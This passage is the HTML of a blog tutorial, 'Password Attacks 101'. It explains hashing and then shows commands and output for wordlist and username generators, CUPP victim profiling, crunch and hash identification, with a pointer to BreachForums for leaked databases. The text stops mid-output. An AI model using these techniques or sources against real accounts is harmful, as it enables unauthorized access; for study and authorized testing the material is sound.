@@ -1,0 +1,842 @@
+<!DOCTYPE html>
+<html 
+  lang="en" 
+  dir="ltr">
+
+<head>
+  <link rel="icon" href="https://machiavelli.me/icons/favicon.ico" type="image/x-icon">
+  <link rel="shortcut icon" href="https://machiavelli.me/icons/favicon.ico" type="image/x-icon">
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+  <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@400;700&display=swap" rel="stylesheet">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <meta http-equiv="content-type" content="text/html; charset=utf-8">
+
+  <!-- Enable responsiveness on mobile devices-->
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+  
+  
+  <meta name="description" content="|_337 |-|4&gt;&lt;0R?" />
+  
+  
+
+  <title>
+    
+    Password Attacks 101
+    
+</title>
+  <link rel="alternate" type="application/atom+xml" title="Machiavelli&#x27;s Homepage Atom Feed" href="https://machiavelli.me/atom.xml" />
+
+  
+  <link rel="stylesheet" href="https://machiavelli.me/site.css">
+  
+
+  
+  
+</head>
+
+<body class="hack dark main container">
+  
+    
+        
+  
+  <header class="nav-header">
+    <nav itemscope itemtype="http://schema.org/SiteNavigationElement" class="navbar">
+      <div class="nav-links">
+        
+        <a itemprop="url"
+          class=""
+          href="https://machiavelli.me">
+          <span itemprop="name">Home</span></a>
+        
+        <a itemprop="url"
+          class=""
+          href="https://machiavelli.me/rquotes">
+          <span itemprop="name">rquotes</span></a>
+        
+        <a itemprop="url"
+          class=""
+          href="https://machiavelli.me/lolbas">
+          <span itemprop="name">lolbas</span></a>
+        
+      </div>
+    </nav>
+    
+    <div class="search-container">
+      <svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke-width="1.5" class="search-icon">
+        <path stroke-linecap="round" stroke-linejoin="round"
+          d="m21 21-5.197-5.197m0 0A7.5 7.5 0 1 0 5.196 5.196a7.5 7.5 0 0 0 10.607 10.607Z" />
+      </svg>
+      <input type="text" id="search" placeholder="Search...">
+      <div class="search-results">
+        <div class="search-results__items"></div>
+      </div>
+    </div>
+    
+
+  </header>
+  
+  
+    
+
+<article itemscope itemtype="http://schema.org/BlogPosting">
+    <header>
+        <h1 itemprop="headline">Password Attacks 101</h1>
+        <span class="muted">
+    <svg class="icon i-clock" viewBox="0 0 32 32"
+         width="16" height="16" fill="none" stroke="currentcolor"
+         stroke-linecap="round" stroke-linejoin="round" stroke-width="6.25%">
+        <circle cx="16" cy="16" r="14"/>
+        <path d="M16 8 L16 16 20 20"/>
+    </svg>
+    <span>10 minute read</span>
+    <svg class="icon i-edit" viewBox="0 0 32 32"
+         width="16" height="16" fill="none" stroke="currentcolor"
+         stroke-linecap="round" stroke-linejoin="round" stroke-width="6.25%">
+        <path d="M30 7 L25 2 5 22 3 29 10 27 Z M21 6 L26 11 Z M5 22 L10 27 Z"/>
+    </svg>
+
+    Published: 2025-01-22
+</span>
+    </header>
+        
+        <nav aria-label="Table of contents">
+        <details>
+            <summary role="button" style="padding: 0rem 0rem 0rem 0rem;margin: 1rem 0rem 1.5rem 0rem;">
+            Table of Contents
+            <br>
+            </summary>
+            <ul>
+            
+                <li>
+                <a href="https://machiavelli.me/password-attacks-101/#concepts-you-need-to-be-familiar-with-before-diving-in">Concepts you need to be familiar with before diving in.</a>
+                
+                </li>
+            
+                <li>
+                <a href="https://machiavelli.me/password-attacks-101/#default-passwords">Default Passwords</a>
+                
+                </li>
+            
+                <li>
+                <a href="https://machiavelli.me/password-attacks-101/#leaked-passwords">Leaked Passwords</a>
+                
+                </li>
+            
+                <li>
+                <a href="https://machiavelli.me/password-attacks-101/#customized-wordlists">Customized Wordlists</a>
+                
+                    <ul>
+                    
+                        <li>
+                        <a href="https://machiavelli.me/password-attacks-101/#usernames-wordlists">Usernames Wordlists</a>
+                        
+                        </li>
+                    
+                    </ul>
+                
+                </li>
+            
+                <li>
+                <a href="https://machiavelli.me/password-attacks-101/#keyspace-technique">Keyspace Technique</a>
+                
+                    <ul>
+                    
+                        <li>
+                        <a href="https://machiavelli.me/password-attacks-101/#cupp">CUPP</a>
+                        
+                        </li>
+                    
+                        <li>
+                        <a href="https://machiavelli.me/password-attacks-101/#crunch">crunch</a>
+                        
+                        </li>
+                    
+                    </ul>
+                
+                </li>
+            
+                <li>
+                <a href="https://machiavelli.me/password-attacks-101/#dictionary-attacks">Dictionary Attacks</a>
+                
+                    <ul>
+                    
+                        <li>
+                        <a href="https://machiavelli.me/password-attacks-101/#hash-identification">Hash Identification</a>
+                        
+                        </li>
+                    
+                        <li>
+                        <a href="https://machiavelli.me/password-attacks-101/#hash-cracking">Hash Cracking</a>
+                        
+                        </li>
+                    
+                    </ul>
+                
+                </li>
+            
+                <li>
+                <a href="https://machiavelli.me/password-attacks-101/#brute-force-attacks">Brute-Force Attacks</a>
+                
+                    <ul>
+                    
+                        <li>
+                        <a href="https://machiavelli.me/password-attacks-101/#command-breakdown">Command Breakdown</a>
+                        
+                        </li>
+                    
+                        <li>
+                        <a href="https://machiavelli.me/password-attacks-101/#custom-rules">Custom Rules</a>
+                        
+                            <ul>
+                            
+                                <li>
+                                <a href="https://machiavelli.me/password-attacks-101/#code-explanation">Code Explanation</a>
+                                </li>
+                            
+                            </ul>
+                        
+                        </li>
+                    
+                        <li>
+                        <a href="https://machiavelli.me/password-attacks-101/#login-pages-brute-force">Login pages brute-force</a>
+                        
+                            <ul>
+                            
+                                <li>
+                                <a href="https://machiavelli.me/password-attacks-101/#ffuf">FFuf</a>
+                                </li>
+                            
+                            </ul>
+                        
+                        </li>
+                    
+                        <li>
+                        <a href="https://machiavelli.me/password-attacks-101/#conclusion">Conclusion</a>
+                        
+                        </li>
+                    
+                    </ul>
+                
+                </li>
+            
+            </ul>
+        </details>
+        </nav>
+
+
+    <div itemprop="articleBody">
+      <p>In today’s digital world, passwords serve as the primary gatekeepers of our online identities and sensitive information. However, these seemingly simple strings of characters are often the target of malicious cyber activities known as password attacks. A password attack involves attempts by hackers to gain unauthorized access to systems, accounts, or data by exploiting weak or poorly managed passwords. These attacks range from brute force and phishing to sophisticated credential-stuffing techniques. Understanding the various types of password attacks and their impact is essential for both individuals and organizations to strengthen their defenses against cyber threats.</p>
+<span id="continue-reading"></span><h2 id="concepts-you-need-to-be-familiar-with-before-diving-in">Concepts you need to be familiar with before diving in.</h2>
+<ol>
+<li>
+<p><strong>Hash</strong><br />
+A hash is a fixed-size string or number generated by a cryptographic hash function from input data of any size. It is a one-way function, meaning it cannot be reversed to retrieve the original input. Hashes are commonly used for data integrity verification, password storage, and digital signatures.<br />
+<strong>Example</strong>:</p>
+<ul>
+<li>Input: <code>"password123"</code></li>
+<li>Hash (using SHA-256): <code>ef92b778bafe771e89245b89ecbc08a44a4e166c06659911881f383d4473e94f</code><br />
+<strong>Learn more</strong>: <a href="https://en.wikipedia.org/wiki/Cryptographic_hash_function">Wikipedia: Cryptographic Hash Function</a></li>
+</ul>
+</li>
+<li>
+<p><strong>Salt</strong><br />
+A salt is a random value added to input data (e.g., a password) before hashing to ensure uniqueness and prevent attacks like rainbow table attacks. Salting makes it harder for attackers to precompute hashes for common inputs.<br />
+<strong>Example</strong>:</p>
+<ul>
+<li>Password: <code>"password123"</code></li>
+<li>Salt: <code>"s0m3R@nd0mS@lt"</code></li>
+<li>Hashed result (password + salt): <code>sha256("password123s0m3R@nd0mS@lt")</code><br />
+<strong>Learn more</strong>: <a href="https://cheatsheetseries.owasp.org/cheatsheets/Password_Storage_Cheat_Sheet.html">OWASP: Password Storage Cheat Sheet</a></li>
+</ul>
+</li>
+<li>
+<p><strong>Pepper</strong><br />
+A pepper is a secret value added to input data (e.g., a password) before hashing, similar to a salt. Unlike a salt, the pepper is not stored in the database and is kept secret, adding an extra layer of security. It is often a static value shared across multiple hashes.<br />
+<strong>Example</strong>:</p>
+<ul>
+<li>Password: <code>"password123"</code></li>
+<li>Pepper: <code>"s3cr3tP3pp3r"</code></li>
+<li>Hashed result (password + pepper): <code>sha256("password123s3cr3tP3pp3r")</code><br />
+<strong>Learn more</strong>: <a href="https://auth0.com/blog/adding-salt-to-hashing-a-better-way-to-store-passwords/">Auth0: Salting vs. Peppering</a></li>
+</ul>
+</li>
+<li>
+<p><strong>Encryption</strong><br />
+Encryption is the process of converting plaintext (readable data) into ciphertext (unreadable data) using an algorithm and a key. It ensures confidentiality, allowing only authorized parties with the correct key to decrypt and access the original data.<br />
+<strong>Example</strong>:</p>
+<ul>
+<li>Plaintext: <code>"Hello, World!"</code></li>
+<li>Encrypted (using AES-256): <code>U2FsdGVkX1+3n6l5z8a7cB1uZ2J4Y5V6</code><br />
+<strong>Learn more</strong>: <a href="https://www.khanacademy.org/computing/computers-and-internet/xcae6f4a7ff015e7d:online-data-security/xcae6f4a7ff015e7d:encryption/a/encryption-decryption-and-code-cracking">Khan Academy: Encryption</a></li>
+</ul>
+</li>
+<li>
+<p><strong>Public Key</strong><br />
+A public key is one half of a key pair in asymmetric cryptography. It is shared openly and used to encrypt data or verify digital signatures. Data encrypted with a public key can only be decrypted with the corresponding private key.<br />
+<strong>Example</strong>:</p>
+<ul>
+<li>Public Key: <code>-----BEGIN PUBLIC KEY----- ... -----END PUBLIC KEY-----</code><br />
+<strong>Learn more</strong>: <a href="https://www.cloudflare.com/learning/ssl/what-is-public-key-cryptography/">Cloudflare: What is Public Key Cryptography?</a></li>
+</ul>
+</li>
+<li>
+<p><strong>Private Key</strong><br />
+A private key is the other half of a key pair in asymmetric cryptography. It is kept secret and used to decrypt data encrypted with the corresponding public key or to create digital signatures. The private key must never be shared.<br />
+<strong>Example</strong>:</p>
+<ul>
+<li>Private Key: <code>-----BEGIN PRIVATE KEY----- ... -----END PRIVATE KEY-----</code><br />
+<strong>Learn more</strong>: <a href="https://www.ssl.com/article/public-key-vs-private-key/">SSL.com: Public and Private Keys</a></li>
+</ul>
+</li>
+<li>
+<p><strong>Signature</strong><br />
+A digital signature is a cryptographic value generated using a private key to verify the authenticity and integrity of data (e.g., a message or document). It ensures that the data has not been tampered with and confirms the identity of the sender. The signature can be verified using the corresponding public key.<br />
+<strong>Example</strong>:</p>
+<ul>
+<li>Message: <code>"Hello, World!"</code></li>
+<li>Signature: <code>3045022100...</code> (generated using the sender's private key)<br />
+<strong>Learn more</strong>: <a href="https://en.wikipedia.org/wiki/Digital_signature">Wikipedia: Digital Signature</a></li>
+</ul>
+</li>
+</ol>
+<h2 id="default-passwords">Default Passwords</h2>
+<p>One of the first techniques I attempt to do when facing a login page is simply trying the default password of that service and one of the most famous credentials is <code>admin:admin</code> or <code>admin:password</code></p>
+<p>You can check the default passwords of various services.</p>
+<ul>
+<li>https://default-password.info</li>
+<li>https://192-168-1-1ip.mobi/default-router-passwords-list</li>
+<li>https://www.defaultpassword.com</li>
+<li>https://cirt.net/passwords</li>
+</ul>
+<h2 id="leaked-passwords">Leaked Passwords</h2>
+<p>Leaked passwords are like a gold mine for attackers because many people reuse the same password across different services. These passwords are often neither strong nor complex, even if they include symbols and numbers. When a database is leaked, attackers can extract passwords or password !. If the passwords are hashed, an additional step is required to crack them (We'll talk about that later). Below are some examples of leaked databases:</p>
+<ul>
+<li>https://github.com/danielmiessler/SecLists/tree/master/Passwords/Leaked-Databases</li>
+</ul>
+<p>Alternatively, you can search for such databases on shiny onion forums like BreachForums.</p>
+<h2 id="customized-wordlists">Customized Wordlists</h2>
+<p>Customized wordlists are, in my opinion, one of the easiest things to create. For example, imagine encountering a WordPress login form during a CTF challenge, and the blog owner is named <strong>Machiavelli</strong>. He’s a tech-savvy individual writing about his new malware and boasting about how his <strong>OpSec</strong> is unbeatable. You decide to create a custom password list from his blog using a tool like <a href="https://github.com/digininja/CeWL">Cewl</a>.</p>
+<pre data-lang="bash" style="background-color:#2b303b;color:#6c7079;" class="language-bash "><code class="language-bash" data-lang="bash"><span style="color:#abb2bf;">
+</span><span style="color:#eb6772;">cewl -d</span><span style="color:#abb2bf;"> 3</span><span style="color:#eb6772;"> -m</span><span style="color:#abb2bf;"> 5</span><span style="color:#eb6772;"> -w</span><span style="color:#abb2bf;"> wordlist.txt https://machiavelli.me
+</span></code></pre>
+<p>The <code>-d</code> flag specifies the depth to spider, the <code>-m</code> flag sets the minimum word length, the <code>-w</code> flag defines the output file to save the results, and finally, the target URL is provided.</p>
+<h3 id="usernames-wordlists">Usernames Wordlists</h3>
+<p>Now we have a bunch of passwords, but we don’t actually know which username might match them. To address this, we start generating a list of possible usernames. By simply knowing the first and last name, we can create a reasonably-sized wordlist to test alongside the password list.</p>
+<p>Fortunately, there are plenty of tools available that can do this for us, so we don’t need to write our own code. Let’s take a look at one of them like <a href="https://github.com/urbanadventurer/username-anarchy">Username-Anarchy</a> as an example.</p>
+<pre data-lang="bash" style="background-color:#2b303b;color:#6c7079;" class="language-bash "><code class="language-bash" data-lang="bash"><span style="color:#abb2bf;">
+</span><span style="color:#eb6772;">./username-anarchy</span><span style="color:#abb2bf;"> anna key
+</span><span style="color:#eb6772;">anna
+</span><span style="color:#eb6772;">annakey
+</span><span style="color:#eb6772;">anna.key
+</span><span style="color:#eb6772;">annakey
+</span><span style="color:#eb6772;">annak
+</span><span style="color:#eb6772;">a.key
+</span><span style="color:#eb6772;">akey
+</span><span style="color:#eb6772;">kanna
+</span><span style="color:#eb6772;">k.anna
+</span><span style="color:#eb6772;">...
+</span><span style="color:#eb6772;">and</span><span style="color:#abb2bf;"> so on
+</span></code></pre>
+<p>We can also take advantage of search engines by scraping data using tools like <a href="https://github.com/m8sec/CrossLinked">CrossLinked</a>.</p>
+<h2 id="keyspace-technique">Keyspace Technique</h2>
+<p>The keyspace technique is a method where we specify a range of numbers, characters, and symbols, combining them to create a wordlist.</p>
+<h3 id="cupp">CUPP</h3>
+<p><a href="https://github.com/Mebus/cupp">CUPP</a> - Common User Passwords Profiler is an interactive and easy tool for creating custom wordlists if we know some details about our target such as first, last name, company, petname and childname which is in this case <strong>Machiavelli</strong> the tech-savvy.</p>
+<pre data-lang="bash" style="background-color:#2b303b;color:#6c7079;" class="language-bash "><code class="language-bash" data-lang="bash"><span style="color:#abb2bf;">
+</span><span style="color:#eb6772;">root@machiavelli:~#</span><span style="color:#abb2bf;"> python3 cupp.py</span><span style="color:#eb6772;"> -i
+</span><span style="color:#eb6772;">cupp.py!                 </span><span style="font-style:italic;color:#5f697a;"># Common
+</span><span style="color:#abb2bf;">   </span><span style="color:#5ebfcc;">\                     </span><span style="font-style:italic;color:#5f697a;"># User
+</span><span style="color:#abb2bf;">    </span><span style="color:#5ebfcc;">\   </span><span style="color:#eb6772;">,__,             </span><span style="font-style:italic;color:#5f697a;"># Passwords
+</span><span style="color:#abb2bf;">     </span><span style="color:#5ebfcc;">\  </span><span style="color:#abb2bf;">(</span><span style="color:#eb6772;">oo</span><span style="color:#abb2bf;">)____         </span><span style="font-style:italic;color:#5f697a;"># Profiler
+</span><span style="color:#abb2bf;">        (</span><span style="color:#eb6772;">__</span><span style="color:#abb2bf;">)    )\</span><span style="background-color:#e05252;color:#ffffff;">   </span><span style="color:#abb2bf;">
+</span><span style="color:#abb2bf;">           </span><span style="color:#adb7c9;">||</span><span style="color:#eb6772;">--</span><span style="color:#adb7c9;">|| </span><span style="color:#eb6772;">*      </span><span style="color:#cd74e8;">[</span><span style="color:#abb2bf;"> Muris Kurgas | j0rgan@remote</span><span style="color:#adb7c9;">-</span><span style="color:#abb2bf;">exploit.org </span><span style="color:#cd74e8;">]
+</span><span style="color:#abb2bf;">                         </span><span style="color:#5ebfcc;">[</span><span style="color:#abb2bf;"> Mebus </span><span style="color:#adb7c9;">| </span><span style="color:#eb6772;">https://github.com/Mebus/]
+</span><span style="color:#abb2bf;">
+</span><span style="color:#abb2bf;">
+</span><span style="color:#eb6772;">[+]</span><span style="color:#abb2bf;"> Insert the information about the victim to make a dictionary
+</span><span style="color:#eb6772;">[+]</span><span style="color:#abb2bf;"> If you don</span><span style="color:#9acc76;">&#39;t know all the info, just hit enter when asked! ;)
+</span><span style="color:#9acc76;">
+</span><span style="color:#9acc76;">&gt; First Name: Niccolo
+</span><span style="color:#9acc76;">&gt; Surname: Bernardo
+</span><span style="color:#9acc76;">&gt; Nickname: Machiavelli
+</span><span style="color:#9acc76;">&gt; Birthdate (DDMMYYYY): 03051469
+</span><span style="color:#9acc76;">
+</span><span style="color:#9acc76;">
+</span><span style="color:#9acc76;">&gt; Partners) name: Marietta
+</span><span style="color:#9acc76;">&gt; Partners) nickname:
+</span><span style="color:#9acc76;">&gt; Partners) birthdate (DDMMYYYY):
+</span><span style="color:#9acc76;">
+</span><span style="color:#9acc76;">
+</span><span style="color:#9acc76;">&gt; Child&#39;</span><span style="color:#abb2bf;">s name: Guido
+</span><span style="color:#adb7c9;">&gt;</span><span style="color:#abb2bf;"> Child</span><span style="color:#9acc76;">&#39;s nickname: Guido
+</span><span style="color:#9acc76;">&gt; Child&#39;</span><span style="color:#abb2bf;">s </span><span style="color:#eb6772;">birthdate</span><span style="color:#abb2bf;"> (DDMMYYYY)</span><span style="color:#5ebfcc;">:
+</span><span style="color:#abb2bf;">
+</span><span style="color:#abb2bf;">
+</span><span style="color:#adb7c9;">&gt;</span><span style="color:#abb2bf;"> Pet</span><span style="color:#9acc76;">&#39;s name: Lorenzo Medici
+</span><span style="color:#9acc76;">&gt; Company name:
+</span><span style="color:#9acc76;">
+</span><span style="color:#9acc76;">
+</span><span style="color:#9acc76;">&gt; Do you want to add some key words about the victim? Y/[N]: N
+</span><span style="color:#9acc76;">&gt; Do you want to add special chars at the end of words? Y/[N]: N
+</span><span style="color:#9acc76;">&gt; Do you want to add some random numbers at the end of words? Y/[N]:N
+</span><span style="color:#9acc76;">&gt; Leet mode? (i.e. leet = 1337) Y/[N]: Y
+</span><span style="color:#9acc76;">
+</span><span style="color:#9acc76;">[+] Now making a dictionary...
+</span><span style="color:#9acc76;">[+] Sorting list and removing duplicates...
+</span><span style="color:#9acc76;">[+] Saving dictionary to niccolo.txt, counting 2188 words.
+</span><span style="color:#9acc76;">&gt; Hyperspeed Print? (Y/n) : n
+</span><span style="color:#9acc76;">[+] Now load your pistolero with niccolo.txt and shoot! Good luck!
+</span></code></pre>
+<p>There's also support for a 1337/leet mode for example machiavelli &gt; m4ch14v3ll1</p>
+<h3 id="crunch">crunch</h3>
+<p>Another method for creating a wordlist is by using the keyspace technique. This approach involves specifying a range of characters, numbers, and symbols to generate the wordlist. One powerful tool for this purpose is Crunch, which allows us to customize the wordlist with various options, such as minimum and maximum lengths, as well as additional parameters, as shown below:</p>
+<pre data-lang="bash" style="background-color:#2b303b;color:#6c7079;" class="language-bash "><code class="language-bash" data-lang="bash"><span style="color:#abb2bf;">
+</span><span style="color:#eb6772;">root@machiavelli:~#</span><span style="color:#abb2bf;"> crunch 6 6 0123456789abcdefgABCDEFG</span><span style="color:#eb6772;"> -o</span><span style="color:#abb2bf;"> list.txt
+</span><span style="color:#eb6772;">Crunch</span><span style="color:#abb2bf;"> will now generate the following amount of data: 1337720832 bytes
+</span><span style="color:#eb6772;">1275</span><span style="color:#abb2bf;"> MB
+</span><span style="color:#eb6772;">1</span><span style="color:#abb2bf;"> GB
+</span><span style="color:#eb6772;">0</span><span style="color:#abb2bf;"> TB
+</span><span style="color:#eb6772;">0</span><span style="color:#abb2bf;"> PB
+</span><span style="color:#eb6772;">Crunch</span><span style="color:#abb2bf;"> will now generate the following number of lines: 191102976
+</span></code></pre>
+<h2 id="dictionary-attacks">Dictionary Attacks</h2>
+<p><strong>Dictionary Attacks</strong> primarily focus on guessing passwords by using well-known words or phrases. These attacks rely on pre-gathered wordlists or leaked databases to systematically try potential passwords.</p>
+<p>Imagine we have a hash obtained after dumping a database via <strong>SQL Injection</strong>. The hash is <code>234e6ebd1d0ddb1a5a39ac0cec6ebe85</code>. The first step in cracking this hash is to identify its type (e.g., MD5, SHA1, SHA256). The second step is to decide which attack mode to use and which wordlist will be most effective.</p>
+<h3 id="hash-identification">Hash Identification</h3>
+<p>We can use various tools to identify the hash type, such as:</p>
+<ol>
+<li><a href="https://github.com/blackploit/hash-identifier">hash-identifier</a></li>
+<li><a href="https://github.com/tashima42/hash-id">hash-id</a></li>
+</ol>
+<p>For this example, I'll use <strong>hash-identifier</strong>.</p>
+<pre data-lang="bash" style="background-color:#2b303b;color:#6c7079;" class="language-bash "><code class="language-bash" data-lang="bash"><span style="color:#abb2bf;">
+</span><span style="color:#eb6772;">root@machiavelli:~#</span><span style="color:#abb2bf;"> hash-identifier
+</span><span style="font-style:italic;color:#5f697a;">#########################################################################
+</span><span style="font-style:italic;color:#5f697a;">#     __  __                     __           ______    _____           #
+</span><span style="font-style:italic;color:#5f697a;">#    /\ \/\ \                   /\ \         /\__  _\  /\  _ `\         #
+</span><span style="font-style:italic;color:#5f697a;">#    \ \ \_\ \     __      ____ \ \ \___     \/_/\ \/  \ \ \/\ \        #
+</span><span style="font-style:italic;color:#5f697a;">#     \ \  _  \  /&#39;__`\   / ,__\ \ \  _ `\      \ \ \   \ \ \ \ \       #
+</span><span style="font-style:italic;color:#5f697a;">#      \ \ \ \ \/\ \_\ \_/\__, `\ \ \ \ \ \      \_\ \__ \ \ \_\ \      #
+</span><span style="font-style:italic;color:#5f697a;">#       \ \_\ \_\ \___ \_\/\____/  \ \_\ \_\     /\_____\ \ \____/      #
+</span><span style="font-style:italic;color:#5f697a;">#        \/_/\/_/\/__/\/_/\/___/    \/_/\/_/     \/_____/  \/___/  v1.2 #
+</span><span style="font-style:italic;color:#5f697a;">#                                                             By Zion3R #
+</span><span style="font-style:italic;color:#5f697a;">#                                                    www.Blackploit.com #
+</span><span style="font-style:italic;color:#5f697a;">#                                                   Root@Blackploit.com #
+</span><span style="font-style:italic;color:#5f697a;">#########################################################################
+</span><span style="color:#eb6772;">--------------------------------------------------
+</span><span style="color:#eb6772;">HASH:</span><span style="color:#abb2bf;"> 234e6ebd1d0ddb1a5a39ac0cec6ebe85
+</span><span style="color:#abb2bf;">
+</span><span style="color:#eb6772;">Possible</span><span style="color:#abb2bf;"> Hashs:
+</span><span style="color:#eb6772;">[+]</span><span style="color:#abb2bf;"> MD5
+</span><span style="color:#eb6772;">[+]</span><span style="color:#abb2bf;"> Domain Cached Credentials - MD4(MD4(($</span><span style="color:#eb6772;">pass</span><span style="color:#abb2bf;">))</span><span style="color:#eb6772;">.</span><span style="color:#abb2bf;">(strtolower($</span><span style="color:#eb6772;">username</span><span style="color:#abb2bf;">)))
+</span><span style="color:#abb2bf;">
+</span><span style="color:#eb6772;">Least</span><span style="color:#abb2bf;"> Possible Hashs:
+</span><span style="color:#eb6772;">[+]</span><span style="color:#abb2bf;"> RAdmin v2.x
+</span><span style="color:#eb6772;">[+]</span><span style="color:#abb2bf;"> NTLM
+</span><span style="color:#eb6772;">[+]</span><span style="color:#abb2bf;"> MD4
+</span><span style="color:#eb6772;">[+]</span><span style="color:#abb2bf;"> MD2
+</span><span style="color:#eb6772;">[+]</span><span style="color:#abb2bf;"> MD5(HMAC)
+</span><span style="color:#eb6772;">[+]</span><span style="color:#abb2bf;"> MD4(HMAC)
+</span><span style="color:#eb6772;">[+]</span><span style="color:#abb2bf;"> MD2(HMAC)
+</span><span style="color:#eb6772;">[+]</span><span style="color:#abb2bf;"> MD5(HMAC(Wordpress))
+</span><span style="color:#eb6772;">[+]</span><span style="color:#abb2bf;"> Haval-128
+</span><span style="color:#eb6772;">[+]</span><span style="color:#abb2bf;"> Haval-128(HMAC)
+</span><span style="color:#eb6772;">[+]</span><span style="color:#abb2bf;"> RipeMD-128
+</span><span style="color:#eb6772;">[+]</span><span style="color:#abb2bf;"> RipeMD-128(HMAC)
+</span><span style="color:#eb6772;">[+]</span><span style="color:#abb2bf;"> SNEFRU-128
+</span><span style="color:#eb6772;">[+]</span><span style="color:#abb2bf;"> SNEFRU-128(HMAC)
+</span><span style="color:#eb6772;">[+]</span><span style="color:#abb2bf;"> Tiger-128
+</span><span style="color:#eb6772;">[+]</span><span style="color:#abb2bf;"> Tiger-128(HMAC)
+</span><span style="color:#eb6772;">[+]</span><span style="color:#abb2bf;"> md5($</span><span style="color:#eb6772;">pass</span><span style="color:#abb2bf;">.$</span><span style="color:#eb6772;">salt</span><span style="color:#abb2bf;">)
+</span><span style="color:#eb6772;">[+]</span><span style="color:#abb2bf;"> md5($</span><span style="color:#eb6772;">salt</span><span style="color:#abb2bf;">.$</span><span style="color:#eb6772;">pass</span><span style="color:#abb2bf;">)
+</span><span style="color:#eb6772;">[+]</span><span style="color:#abb2bf;"> md5($</span><span style="color:#eb6772;">salt</span><span style="color:#abb2bf;">.$</span><span style="color:#eb6772;">pass</span><span style="color:#abb2bf;">.$</span><span style="color:#eb6772;">salt</span><span style="color:#abb2bf;">)
+</span><span style="color:#eb6772;">[+]</span><span style="color:#abb2bf;"> md5($</span><span style="color:#eb6772;">salt</span><span style="color:#abb2bf;">.$</span><span style="color:#eb6772;">pass</span><span style="color:#abb2bf;">.$</span><span style="color:#eb6772;">username</span><span style="color:#abb2bf;">)
+</span><span style="color:#eb6772;">[+]</span><span style="color:#abb2bf;"> md5($</span><span style="color:#eb6772;">salt</span><span style="color:#abb2bf;">.md5($</span><span style="color:#eb6772;">pass</span><span style="color:#abb2bf;">))
+</span><span style="color:#eb6772;">[+]</span><span style="color:#abb2bf;"> md5($</span><span style="color:#eb6772;">salt</span><span style="color:#abb2bf;">.md5($</span><span style="color:#eb6772;">pass</span><span style="color:#abb2bf;">))
+</span><span style="color:#eb6772;">[+]</span><span style="color:#abb2bf;"> md5($</span><span style="color:#eb6772;">salt</span><span style="color:#abb2bf;">.md5($</span><span style="color:#eb6772;">pass</span><span style="color:#abb2bf;">.$</span><span style="color:#eb6772;">salt</span><span style="color:#abb2bf;">))
+</span><span style="color:#eb6772;">[+]</span><span style="color:#abb2bf;"> md5($</span><span style="color:#eb6772;">salt</span><span style="color:#abb2bf;">.md5($</span><span style="color:#eb6772;">pass</span><span style="color:#abb2bf;">.$</span><span style="color:#eb6772;">salt</span><span style="color:#abb2bf;">))
+</span><span style="color:#eb6772;">[+]</span><span style="color:#abb2bf;"> md5($</span><span style="color:#eb6772;">salt</span><span style="color:#abb2bf;">.md5($</span><span style="color:#eb6772;">salt</span><span style="color:#abb2bf;">.$</span><span style="color:#eb6772;">pass</span><span style="color:#abb2bf;">))
+</span><span style="color:#eb6772;">[+]</span><span style="color:#abb2bf;"> md5($</span><span style="color:#eb6772;">salt</span><span style="color:#abb2bf;">.md5(md5($</span><span style="color:#eb6772;">pass</span><span style="color:#abb2bf;">)</span><span style="color:#eb6772;">.$salt</span><span style="color:#abb2bf;">))
+</span><span style="color:#eb6772;">[+]</span><span style="color:#abb2bf;"> md5($</span><span style="color:#eb6772;">username</span><span style="color:#abb2bf;">.0.$</span><span style="color:#eb6772;">pass</span><span style="color:#abb2bf;">)
+</span><span style="color:#eb6772;">[+]</span><span style="color:#abb2bf;"> md5($</span><span style="color:#eb6772;">username</span><span style="color:#abb2bf;">.LF.$</span><span style="color:#eb6772;">pass</span><span style="color:#abb2bf;">)
+</span><span style="color:#eb6772;">[+]</span><span style="color:#abb2bf;"> md5($</span><span style="color:#eb6772;">username</span><span style="color:#abb2bf;">.md5($</span><span style="color:#eb6772;">pass</span><span style="color:#abb2bf;">)</span><span style="color:#eb6772;">.$salt</span><span style="color:#abb2bf;">)
+</span><span style="color:#eb6772;">[+]</span><span style="color:#abb2bf;"> md5(md5($</span><span style="color:#eb6772;">pass</span><span style="color:#abb2bf;">))
+</span><span style="color:#eb6772;">[+]</span><span style="color:#abb2bf;"> md5(md5($</span><span style="color:#eb6772;">pass</span><span style="color:#abb2bf;">)</span><span style="color:#eb6772;">.$salt</span><span style="color:#abb2bf;">)
+</span><span style="color:#eb6772;">[+]</span><span style="color:#abb2bf;"> md5(md5($</span><span style="color:#eb6772;">pass</span><span style="color:#abb2bf;">)</span><span style="color:#eb6772;">.md5</span><span style="color:#abb2bf;">($</span><span style="color:#eb6772;">salt</span><span style="color:#abb2bf;">))
+</span><span style="color:#eb6772;">[+]</span><span style="color:#abb2bf;"> md5(md5($</span><span style="color:#eb6772;">salt</span><span style="color:#abb2bf;">)</span><span style="color:#eb6772;">.$pass</span><span style="color:#abb2bf;">)
+</span><span style="color:#eb6772;">[+]</span><span style="color:#abb2bf;"> md5(md5($</span><span style="color:#eb6772;">salt</span><span style="color:#abb2bf;">)</span><span style="color:#eb6772;">.md5</span><span style="color:#abb2bf;">($</span><span style="color:#eb6772;">pass</span><span style="color:#abb2bf;">))
+</span><span style="color:#eb6772;">[+]</span><span style="color:#abb2bf;"> md5(md5($</span><span style="color:#eb6772;">username</span><span style="color:#abb2bf;">.$</span><span style="color:#eb6772;">pass</span><span style="color:#abb2bf;">)</span><span style="color:#eb6772;">.$salt</span><span style="color:#abb2bf;">)
+</span><span style="color:#eb6772;">[+]</span><span style="color:#abb2bf;"> md5(md5(md5($</span><span style="color:#eb6772;">pass</span><span style="color:#abb2bf;">)))
+</span><span style="color:#eb6772;">[+]</span><span style="color:#abb2bf;"> md5(md5(md5(md5($</span><span style="color:#eb6772;">pass</span><span style="color:#abb2bf;">))))
+</span><span style="color:#eb6772;">[+]</span><span style="color:#abb2bf;"> md5(md5(md5(md5(md5($</span><span style="color:#eb6772;">pass</span><span style="color:#abb2bf;">)))))
+</span><span style="color:#eb6772;">[+]</span><span style="color:#abb2bf;"> md5(sha1($</span><span style="color:#eb6772;">pass</span><span style="color:#abb2bf;">))
